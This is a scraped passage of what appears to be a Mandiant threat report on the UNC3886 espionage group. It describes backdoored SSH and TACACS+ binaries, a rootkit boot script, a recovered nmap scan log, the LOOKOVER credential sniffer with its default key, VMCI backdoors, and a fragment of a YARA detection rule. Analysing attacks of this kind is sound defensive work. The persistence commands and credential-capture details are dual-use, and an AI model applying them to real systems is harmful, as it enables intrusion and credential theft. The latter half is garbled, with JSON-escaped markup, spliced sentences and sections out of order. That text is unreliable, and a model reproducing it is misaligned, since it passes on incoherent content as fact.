the </span><code style="vertical-align:baseline">versionlock.list</code><span style="vertical-align:baseline"> file. Content of the </span><code style="vertical-align:baseline">versionlock.list</code><span style="vertical-align:baseline"> file is presented as follows with the timestamp when the locks were added.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code># Added lock on Tue Oct 25 23:28:07 2022
openssh-clients-0:8.0p1-13.el8.*
openssh-server-0:8.0p1-13.el8.*</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h3><span style="vertical-align:baseline">Bring Your Own SSH Server</span></h3>
<p><span style="vertical-align:baseline">In addition to the backdoored SSH binaries deployed to collect SSH credentials, the threat actor was observed leveraging MEDUSA rootkit to deploy a custom SSH server with the same malicious goals.</span></p>
<p><span style="vertical-align:baseline">Per the findings from MEDUSA rootkit analysis, Mandiant indicated that the threat actor utilized </span><code style="vertical-align:baseline">BOOT_SCRIPT</code><span style="vertical-align:baseline"> parameter of MEDUSA located at </span><code style="vertical-align:baseline">/usr/lib/locate/.boot.sh</code><span style="vertical-align:baseline"> to execute the following executables and a command on boot:</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>/usr/sbin/libvird
/usr/bin/NetworkManage
chcon -t sshd_tmp_t /var/run/cron.data</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The hijacking of SSH connections to obtain credentials starts with the execution of </span><code style="vertical-align:baseline">/usr/sbin/libvird</code><span style="vertical-align:baseline">. </span><code style="vertical-align:baseline">Libvird</code><span style="vertical-align:baseline">, which is an injector based on a publicly available </span><a href="https://github.com/kubo/injector" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">kubo/injector</span></a><span style="vertical-align:baseline"> project embedded with a payload. </span><code style="vertical-align:baseline">libvird</code><span style="vertical-align:baseline"> creates a library file identified as </span><code style="vertical-align:baseline">/lib64/libseconfd.so </code><span style="vertical-align:baseline">from the embedded payload and injects the library to </span><code style="vertical-align:baseline">sshd</code><span style="vertical-align:baseline"> by default if both the target program and the library file are not provided.</span></p>
<p><span style="vertical-align:baseline">Mandiant recovered and conducted analysis of the file with the same hash as the payload embedded in </span><code style="vertical-align:baseline">libvird</code><span style="vertical-align:baseline">. The analysis observed that the payload intercepts </span><code style="vertical-align:baseline">checkfd()</code><span style="vertical-align:baseline"> of </span><code style="vertical-align:baseline">sshd</code><span style="vertical-align:baseline"> when executed and verifies if the received data contains </span><code style="vertical-align:baseline">SSH-2.0-OpenSSH_6pf</code><span style="vertical-align:baseline">. The payload redirects the stream to the Unix socket </span><code style="vertical-align:baseline">/var/run/cron.data</code><span style="vertical-align:baseline">.</span></p>
<p><span style="vertical-align:baseline">Mandiant identified </span><code style="vertical-align:baseline">/usr/bin/NetworkManage</code><span style="vertical-align:baseline"> as a SSH server based on a publicly available SSH server </span><a href="https://github.com/wzshiming/sshd" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">wzshiming/sshd</span></a><span style="vertical-align:baseline">. The SSH server creates, monitors, and picks up the connection redirected to the Unix socket </span><code style="vertical-align:baseline">/var/run/cron.data</code><span style="vertical-align:baseline">.</span></p>
<p><span style="vertical-align:baseline">Lastly, the final command inside </span><code style="vertical-align:baseline">/usr/lib/locate/.boot.sh</code><span style="vertical-align:baseline"> was used to apply the SELinux security context of the Unix socket file </span><code style="vertical-align:baseline">/var/run/cron.dat</code><span style="vertical-align:baseline"> to be the predefined </span><code style="vertical-align:baseline">sshd_tmp_t</code><span style="vertical-align:baseline"> context, which is the security context tailored to temporary files used by the SSH daemon. This to ensure that the Unix socket used by the injector and the custom SSH server is accessible and writable when SELinux is enabled.</span></p>
<p><span style="vertical-align:baseline">The threat actor was observed deploying another injector identified as </span><code style="vertical-align:baseline">sentry</code><span style="vertical-align:baseline"> and the custom SSH server identified as </span><code style="vertical-align:baseline">sshdng-venter-7.0</code><span style="vertical-align:baseline"> on another endpoint. Analysis of the two executables identified the same injection and redirection operations as observed with </span><code style="vertical-align:baseline">libvird</code><span style="vertical-align:baseline"> and </span><code style="vertical-align:baseline">NetworkManage</code><span style="vertical-align:baseline">.</span></p>
<h2><span style="vertical-align:baseline">Toward the Intrusion Goals</span></h2>
<h3><span style="vertical-align:baseline">The Remnants of Internal Recon and Lateral Movement</span></h3>
<p><span style="vertical-align:baseline">The objectives of the threat actor were initially unclear due to limited visibility and the extensive use of rootkits, tools, and scripts to eliminate forensic artifacts. When considering goal achievement, it is trivial to assume that a cyber espionage threat actor would focus on specific information. Yet pinpointing the exact type of information becomes challenging as it is situational. After a comprehensive analysis of the unallocated space of the compromised endpoints acting as a jump server, Mandiant identified some evidence that indicated what the threat actor's ultimate intentions may have been.</span></p>
<p><span style="vertical-align:baseline">Mandiant successfully recovered scan logs generated by NMAP. The scan logs were created using the </span><code style="vertical-align:baseline">-oG</code><span style="vertical-align:baseline"> parameter, which resulted in the recording of detailed scan information, including the NMAP executable, the scan initiation timestamp, the options, and the scan result. The sample log is presented as follows. Note that information related to victim organizations is redacted.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code># Nmap 6.49BETA1 scan initiated [redacted] as: ./sc -sS -Pn -n 
--open --host-timeout 30 -T4 -v -oG result.txt -p 902,2012,4786,443 
A.B.C.D/24
# Ports scanned: TCP(4;443,902,2012,4786) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: A.B.C.1 ()	Ports: 443/open/tcp//https///, 
4786/open/tcp//smart-install///
	Ignored State: filtered (2)
Host: A.B.C.1 ()	Status: Up
Host: A.B.C.1 ()	Status: Timeout
Host: A.B.C.2 ()	Status: Up
Host: A.B.C.2 ()	Ports: 4786/open/tcp//smart-install///
	Ignored State: filtered (3)
Host: A.B.C.3 ()	Status: Up
Host: A.B.C.3 ()	Ports: 443/open/tcp//https///
	Ignored State: filtered (3)
Host: A.B.C.4 ()	Status: Up
Host: A.B.C.4 ()	Status: Ports: 902/open/tcp//ideafarm-door///
	Ignored State: filtered (3)
Host: A.B.C.5 ()	Status: Up
Host: A.B.C.5 ()	Status: Timeout
Host: A.B.C.6 ()	Status: Up
Host: A.B.C.6 ()	Ports: 4786/open/tcp//smart-install///
	Ignored State: filtered (3)
.......
</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The following observations were made from the sample scan log:</span></p>
<ul>
<li><strong style="vertical-align:baseline">NMAP executable</strong><span style="vertical-align:baseline">: The threat actor brought their own NMAP executable for scanning. The executable </span><code style="vertical-align:baseline">sc</code><span style="vertical-align:baseline"> was also located on the unallocated space and identified as a stand-alone version of the NMAP.</span></li>
<li><strong style="vertical-align:baseline">Scanning parameters</strong><span style="vertical-align:baseline">: TCP SYN scan was initiated in the aggressive mode without DNS resolution and host discovery, targeting TCP/443, TCP/902, TCP/2012, and TCP/4786 of </span><code style="vertical-align:baseline">10.A.B.C/24</code><span style="vertical-align:baseline">. The result was recorded to </span><code style="vertical-align:baseline">result.txt</code><span style="vertical-align:baseline"> with a record of only open or possibly open ports.</span></li>
<li><strong style="vertical-align:baseline">Scanning results</strong><span style="vertical-align:baseline">: The result indicates alive hosts with the open ports.</span></li>
</ul>
<p><span style="vertical-align:baseline">With the assumption that the services running on the alive hosts configured with the default port number, the alive hosts identified with TCP/4786 were possibly Cisco network appliances as the port is commonly assigned for Cisco Smart Install (SMI) service. TCP/902 indicates VMware technologies. By aggregating data from other scan logs and validating with the victim, it was established that the targeted networks belonged to foreign networks under the management of the victim organization. This marked the point at which a supply chain attack scenario became conceivable.</span></p>
<p><span style="vertical-align:baseline">The existence of NMAP scan logs suggests that there is connectivity from the jump server to the foreign networks, although accessibility requires legitimate credentials. The final clue aligned with this assumption as the ongoing investigation uncovered malicious activities on a TACACS+ server accessible from the jump server.</span></p>
<p><span style="vertical-align:baseline">TACACS is a network protocol used in computer networking for providing centralized authentication, authorization, and accounting (AAA) service. TACACS+ represents an enhanced and more robust version of the original TACACS protocol. Network appliances employ TACACS+ for security and access control, ensuring that authenticated users are authorized to execute actions that are monitored for auditing purposes.</span></p>
<p><span style="vertical-align:baseline">An unauthorized access to a system functioning as an authentication server like a TACACS+ server is an absolute security nightmare. The threat actor could access or manipulate user credentials and authorization policies stored within its database. Accountability of TACACS+ would also be affected as the threat actor could tamper with the accounting logs stored on the TACACS+ server, covering their tracks and concealing malicious activities.</span></p>
<p><span style="vertical-align:baseline">The following sections describe actions performed by the threat actor to extend their access to the target network appliances.</span></p>
<h3><span style="vertical-align:baseline">Capturing TACACS+ Credentials with LOOKOVER</span></h3>
<p><span style="vertical-align:baseline">The threat actor's first attempt to extend their access to the network appliances by targeting the TACACS server was the use of LOOKOVER. LOOKOVER is a sniffer written in C that processes TACACS+ authentication packets, performs decryption, and writes its contents to a specified file path. LOOKOVER uses the publicly available libpcap library to sniff TCP packets.</span></p>
<p><span style="vertical-align:baseline">The threat actor deployed LOOKOVER on the TACACS+ server at </span><code style="vertical-align:baseline">/usr/sbin/au&lt;unique_keyword&gt;ditd</code><span style="vertical-align:baseline">. The sample required the following environment variables to be configured:</span></p>
<ul>
<li><code style="vertical-align:baseline">TKEY</code><span style="vertical-align:baseline"> - TACACS+ pre-shared key; contains default key </span><code style="vertical-align:baseline">7ujm^YHN</code><span style="vertical-align:baseline"> (required)</span></li>
<li><code style="vertical-align:baseline">FILTER</code><span style="vertical-align:baseline"> - libpcap filter string (required)</span></li>
<li><code style="vertical-align:baseline">DEVICE</code><span style="vertical-align:baseline"> - libpcap capture device (optional)</span></li>
<li><code style="vertical-align:baseline">SNFILENAME</code><span style="vertical-align:baseline"> - processed data output path, optional with default set to </span><code style="vertical-align:baseline">/var/lib/libsyslog.so</code><span style="vertical-align:baseline">. All data written to this file is XORed with the single byte </span><code style="vertical-align:baseline">0xEF</code><span style="vertical-align:baseline">.</span></li>
</ul>
<p><span style="vertical-align:baseline">Analysis of the LOOKOVER sample indicates that the samples process TCP packets whose first two bytes of data are </span><code style="vertical-align:baseline">0xC0</code><span style="vertical-align:baseline"> and </span><code style="vertical-align:baseline">0x01</code><span style="vertical-align:baseline"> and verify if the next byte is </span><code style="vertical-align:baseline">0x01</code><span style="vertical-align:baseline"> or </span><code style="vertical-align:baseline">0x03</code><span style="vertical-align:baseline">. The pattern aligns with TACACS+ packet header as described in </span><a href="https://datatracker.ietf.org/doc/html/rfc8907#name-the-tacacs-packet-header" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">RFC 8907</span></a><span style="vertical-align:baseline"> as follows:</span></p>
<ul>
<li><code style="vertical-align:baseline">0xC0</code><span style="vertical-align:baseline"> indicates the major (</span><code style="vertical-align:baseline">0xC</code><span style="vertical-align:baseline">) and the minor (</span><code style="vertical-align:baseline">0x0</code><span style="vertical-align:baseline">) TACACS+ version number.</span></li>
<li><code style="vertical-align:baseline">0x01</code><span style="vertical-align:baseline"> indicates that the packet type is </span><code style="vertical-align:baseline">TAC_PLUS_AUTHEN.</code></li>
<li><span style="vertical-align:baseline">The next byte indicates the sequence number of the current packet; LOOKOVER targets if the sequence number is </span><code style="vertical-align:baseline">0x01</code><span style="vertical-align:baseline"> or </span><code style="vertical-align:baseline">0x03</code><span style="vertical-align:baseline">, which are commonly packets sent from the client to the TACACS+ server.</span></li>
</ul>
<p><span style="vertical-align:baseline">The sample verifies if the flag bit is </span><code style="vertical-align:baseline">0x0</code><span style="vertical-align:baseline">, which indicates that the payload is encrypted. If the flag bit is </span><code style="vertical-align:baseline">0x0</code><span style="vertical-align:baseline">, the sample then performs TACACS+ decryption by incorporating the first 12 bytes of TCP along with </span><code style="vertical-align:baseline">TKEY</code><span style="vertical-align:baseline"> into an MD5 hash and uses the hash to XOR-decode the remainder of the TCP data. The decoded data along with the packet source IP address and an integer from the first 12 bytes are written to </span><code style="vertical-align:baseline">SNFILENAME</code><span style="vertical-align:baseline">.</span></p>
<p><span style="vertical-align:baseline">If the next byte is nonzero, which could indicate a plain text payload, the entire data segment of the TCP packet is written to </span><code style="vertical-align:baseline">FILENAME</code><span style="vertical-align:baseline">.</span></p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig5.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig5.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal src="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig5.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig5.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 5: LOOKOVER's function responsible for handling TACACS+ packets</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">During the analysis of the compromised TACACS+ server, Mandiant identified the presence of </span><code style="vertical-align:baseline">/usr/sbin/au&lt;unique_keyword&gt;ditd</code><span style="vertical-align:baseline"> core dump file. Analysis of the core dump file revealed that the threat actor configured the </span><code style="vertical-align:baseline">FILTER</code><span style="vertical-align:baseline"> environment variable as </span><code style="vertical-align:baseline">port 49</code><span style="vertical-align:baseline"> with </span><code style="vertical-align:baseline">/var/log/tac_cisco_&lt;unique_keyword&gt;_log</code><span style="vertical-align:baseline"> as </span><code style="vertical-align:baseline">SNFILENAME</code><span style="vertical-align:baseline">. TCP/49 is used by TACACS+ Login Host protocol to handle an authentication request from devices. The process crashed when attempting to encrypt extracted credentials before writing to disks, and this could influence the threat actor to employ another approach to target TACACS+.</span></p>
<h3><span style="vertical-align:baseline">Backdoored TACACS+ Binary</span></h3>
<p><span style="vertical-align:baseline">On the same TACACS+ server identified with LOOKOVER, Mandiant observed the threat actor replaced the legitimate </span><code style="vertical-align:baseline">/usr/bin/tac_plus</code><span style="vertical-align:baseline">, which is the TACACS+ daemon for Linux, with a malicious version containing credential logging functionality.</span></p>
<p><span style="vertical-align:baseline">The malicious version of </span><code style="vertical-align:baseline">/usr/bin/tac_plus</code><span style="vertical-align:baseline"> was modified with a new function responsible for logging TACACS+ credentials to </span><code style="vertical-align:baseline">/var/log/tacu&lt;unique_keyword&gt;cs.log</code><span style="vertical-align:baseline">. The function was inserted in the </span><code style="vertical-align:baseline">verify()</code><span style="vertical-align:baseline"> after the password was validated and in the </span><code style="vertical-align:baseline">passwd_file_verify()</code><span style="vertical-align:baseline">, which is responsible for confirming a credential after the password is confirmed to be correct. The captured credential record is XOR-ed with </span><code style="vertical-align:baseline">0xEF</code><span style="vertical-align:baseline"> before appending to the credential log file.</span></p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 6: Malicious function within tac_plus for capturing credentials</p></span></div></section></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig7.max-700x700.png" glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/unc3886-cloaked-covert-fig7.max-700x700.png" class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 7: Backdoored authentication function of tac_plus</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2><span style="vertical-align:baseline">The Family of VMCI Backdoors</span></h2>
<p><span style="vertical-align:baseline">Mandiant discovered a new variant of backdoors leveraging the Virtual Machine Communication Interface (VMCI) as a communication protocol. The VMCI backdoors could facilitate either guest-to-guest or host-to-guest communications to achieve command execution. See </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/"><span style="text-decoration:underline;vertical-align:baseline">the overview of the attacker's use of ESXi Hypervisor VMCI communications</span></a><span style="vertical-align:baseline"> for more information.</span></p>
<ul>
<li><strong style="vertical-align:baseline">VIRTUALSHINE</strong><span style="vertical-align:baseline"> is a simple VMware VMCI sockets-based backdoor that provides access to a bash shell. VIRTUALSHINE connects to a specified target, which streams the bash pty.</span></li>
<li><strong style="vertical-align:baseline">VIRTUALPIE</strong><span style="vertical-align:baseline"> is a backdoor written in Python that spawns a demonized IPv6 listener on a hard-coded TCP port. It supports file transfer, arbitrary command execution, and reverse shell capabilities. It communicates using a custom protocol and the data is encrypted using RC4.</span></li>
<li><strong style="vertical-align:baseline">VIRTUALSPHERE</strong><span style="vertical-align:baseline"> is the controller part of a simple VMCI-based backdoor. The malware transmits the second command-line argument over the VMCI socket to the server running inside the target VM.</span></li>
</ul>
<p><span style="vertical-align:baseline">We plan to release technical details of the VMCI backdoors in a future blog post.</span></p>
<h2><span style="vertical-align:baseline">Campaign 23-022 and Indicators of Compromise</span></h2>
<p><span style="vertical-align:baseline">Since March 2023, we have tracked UNC3886 activity leveraging zero-day exploits for Fortinet and VMware technologies as part of </span><span style="vertical-align:baseline">Campaign 23-022</span><span style="vertical-align:baseline"> in <a href="https://cloud.google.com/security/products/mandiant-threat-intelligence">Mandiant Advantage</a> for our customers. The majority of organizations that Mandiant has responded to or identified as targets through our own analysis have been located in the North America, Southeast Asia, or Oceania regions. However, we have also identified evidence of additional victims located in Europe, Africa, and other parts of Asia. Industries that Mandiant has observed being targeted are those typically observed in espionage operations, namely governments, telecommunications, technology, aerospace and defense, and energy and utility sectors. </span></p>
<p><span style="vertical-align:baseline">To assist the wider community in hunting and identifying activity outlined in this blog post, we have included a subset of these indicators of compromise (IOCs) in this post, and in a </span><a href="https://www.virustotal.com/gui/collection/7348124563bbbc386fcda8a66c43de6d1a3dcfd370edff22e3131afe7e3bc9dc" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">publicly available GTI Collection</span></a><span style="vertical-align:baseline">.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h3>Host-Based Indicators</h3>

  $code1 = { 2F 76 61 72 2F 6C 6F 67 }

  $debug2 = "=== %s ===" ascii
  $debug3 = "searching record in file %s" ascii
  $debug4 = "record not matched, not modifing %s" ascii
  $debug5 = "delete %d records in %s" ascii
  $debug6 = "NEVER_LOGIN" ascii
  $debug7 = "you need to specify a username to clear" ascii
  $pattern1 = "%-10s%-10s%-10s%-20s%-10s" ascii

Mandiant has observed that UNC3886 employed several layers of organized persistence for redundancy to maintain access to compromised environments over time. Persistence mechanisms encompassed network devices, hypervisors, and virtual machines, ensuring alternative channels remain available even if the primary layer is detected and eliminated.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThis blog post discusses UNC3886's intrusion path and subsequent actions that were persistence\u003c/span\u003e\u003c/li\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eDeployment of malware that leveraged trusted third-party services for command and malware \u003c/span\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eMandiant has published \u003c/span\u003e\u003ca Mandiant recommends that organizations follow the security recommendations within the \u003c/span\u003e\u003ca href\u003d\"https://core.vmware.com/vsphere-esxi-mandiant-malware-persistence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eVMware\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e and \u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\u003ca href\u003d\"https://www.fortiguard.com/psirt/FG-IR-22-369\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eFortinet\u003c/a\u003e advisories\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e and the security recommendations provided in this blog post.\u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eZero-Day Exploitation\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIn January 2024, Mandiant published a blog post detailing \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/chinese-vmware-exploitation-since-2021/\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eUNC3886's activities exploiting CVE-2023-34048\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (VMware vCenter) since late 2021. The exploitation enables unauthenticated remote command execution on vulnerable vCenter servers. Mandiant observed deployment of attacker backdoors minutes after crashing of the vulnerable VMware service.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCVE-2023-34048 was not the only zero-day vulnerability exploited by UNC3886 during these intrusions. The threat actor exploited three other zero-day vulnerabilities, which have since been patched, to gain access when obtaining and abusing credentials of existing accounts was infeasible. Figure 1 describes the UNC3886 attack path involving the following zero-day exploitations:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCVE-2022-41328 in FortiOS was exploited to download and execute backdoors on FortiGate devices.\u003c/span\u003e\u003c/li\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCVE-2022-22948 in VMware vCenter was exploited to obtain encrypted credentials in the vCenter's postgresDB for further access.\u003c/span\u003e\u003c/li\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCVE-2023-20867\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e in VMware Tools was exploited to execute unauthenticated Guest Operations from ESXi host to guest virtual machines.\u003c/span\u003e\u003c/li\u003e\n\u003c/ul\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 1: UNC3886 attack path style\u003d\"vertical-align:baseline\"\u003eMandiant observed the threat actor exploit CVE-2022-42475 in FortiOS's Secure Sockets Layer (SSL) virtual private network (VPN) to obtain access in January 2023 after details of the vulnerability had been made public by Fortinet as part of their \u003c/span\u003e\u003ca href\u003d\"https://www.fortiguard.com/psirt_policy\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003evulnerability disclosure processes\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e. CVE-2022-42475 allows a remote unauthenticated attacker to execute arbitrary code or commands via specifically crafted requests.\u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUse of Publicly Available Rootkits for Long-Term Persistence\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAfter exploiting zero-day vulnerabilities to gain access to vCenter servers and subsequently managed ESXi servers, the actor obtained total control of guest virtual machines that shared the same ESXi server as the vCenter server. Mandiant observed the actor use two publicly available rootkits, REPTILE and MEDUSA, on the guest virtual machines to maintain access and evade detection.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eREPTILE\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eREPTILE is an open-source Linux rootkit, implemented as a loadable kernel module (LKM), that provides backdoor access to a system. The rootkit and backdoor functionalities are implemented as a separate component identified by Mandiant as follows:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eREPTILE.CMD is a user-mode component responsible for communicating with the kernel-mode component to perform actions including hiding files, processes, and network connections.\u003c/span\u003e\u003c/li\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eREPTILE.SHELL is a reverse shell backdoor running in user-mode. The component could be configured to listen for a specialized packet in TCP, UDP, or ICMP for activation.\u003c/span\u003e\u003c/li\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eREPTILE kernel-level component is an LKM responsible for hooking kernel functions and modifying functions data as tasked by REPTILE.CMD to achieve rootkit functionality.\u003c/span\u003e\u003c/li\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eREPTILE LKM launcher is responsible for decrypting the actual kernel module code from the file and loading into the memory.\u003c/span\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eREPTILE appeared to be the rootkit of choice by UNC3886 as it was observed being deployed immediately after gaining access to compromised endpoints. REPTILE offers both the common backdoor functionality, such as command execution and file transfer capabilities, as well as stealth functionality that enables the threat actor to evasively access and control the infected endpoints via port knocking.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eMandiant observed that UNC3886 introduced several changes into the REPTILE code base and its auxiliary components. Some changes are based on the REPTILE code base before version 2.1, which was introduced on March 1, 2020, potentially indicating the actor has been developing and/or operating this rootkit for some time. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eOne such change was identified within the UNC3886 REPTILE LKM launcher. In REPTILE version 2.0, the original developer of REPTILE altered how the kernel-level component is loaded, switching from using \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003einsmod\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e to a \u003c/span\u003e\u003ca href\u003d\"https://github.com/f0rb1dd3n/Reptile/blob/965dc73bef36877574a43523fe1b7ec55c52cd9f/loader.c\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003ecustom launcher\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e. The launcher Mandiant observed UNC3886 use throughout their operations, based on the custom launcher, was updated with a new function to daemonize a process. This function is identical to the publicly available \u003c/span\u003e\u003ca href\u003d\"https://github.com/NorthWardTop/posix/blob/master/process/create_daemon.c\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003ccode style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003ecreate_daemon.c\u003c/code\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC3886 automated the deployment of REPTILE components with shell scripts. These scripts contained similar code to \u003c/span\u003e\u003ca href\u003d\"https://github.com/f0rb1dd3n/Reptile/blob/965dc73bef36877574a43523fe1b7ec55c52cd9f/setup.sh\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003ethe installation 